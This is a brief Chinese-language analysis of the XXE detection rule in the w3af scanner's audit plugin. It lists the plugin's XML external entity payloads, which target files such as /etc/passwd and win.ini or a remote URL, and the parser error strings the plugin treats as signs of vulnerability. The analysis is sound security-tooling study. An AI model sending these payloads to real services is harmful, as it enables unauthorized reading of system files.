# w3af xxe 漏扫规则分析

文件位置
https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py

## 说明

将正常请求中的 URL 参数替换为类似如下的 payload 。

使用的 payload

```
通用检测 payload

1
<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]><x>&xxe_test;</x>

2
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]><x>&xxe_test;</x>

3
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "%s">]><foo>&xxe_test;</foo>

4
<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file://%s"> ]><x>&xxe_test;</x>

5
<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///%s"> ]><x>&xxe_test;</x>


4 与 5 的区别是 file:// 与 file:/// 的区别




其中 %s 会被替换

Windows 环境可能成功的路径 
'%SYSTEMDRIVE%\\boot.ini',
'%WINDIR%\\win.ini',

Linux 环境可能成功的路径 
'/etc/passwd',

还会尝试替换为远程文件
'http://w3af.org/xxe.txt'


```


以上 payload 的发送，可能会触发 XML Parser 的一些报错信息。

https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py#L84-L124


```python
XML_PARSER_ERRORS = [
    # PHP
    'xmlParseEntityDecl',
    'simplexml_load_string',
    'xmlParseInternalSubset',
    'DOCTYPE improperly terminated',
    'Start tag expected',
    'No declaration for attribute',
    'No declaration for element',

    # libxml and python
    'failed to load external entity',
    'Start tag expected',
    'Invalid URI: file:///',
    'Malformed declaration expecting version',
    'Unicode strings with encoding',

    # java
    'must be well-formed',
    'Content is not allowed in prolog',
    'org.xml.sax',
    'SAXParseException',
    'com.sun.org.apache.xerces',

    # ruby
    'ParseError',
    'nokogiri',
    'REXML',

    # golang
    'XML syntax error on line',
    'Error unmarshaling XML',
    'conflicts with field',
    'illegal character code'

    # .NET
    'XML Parsing Error',
    'SyntaxError',
    'no root element',
    'not well-formed',
]
```

此外，插件还会根据现有的 XML 参数内容构造新的 payload 。

如果服务端响应中包含报错信息，说明此处存在潜在的 XML 注入的可能性。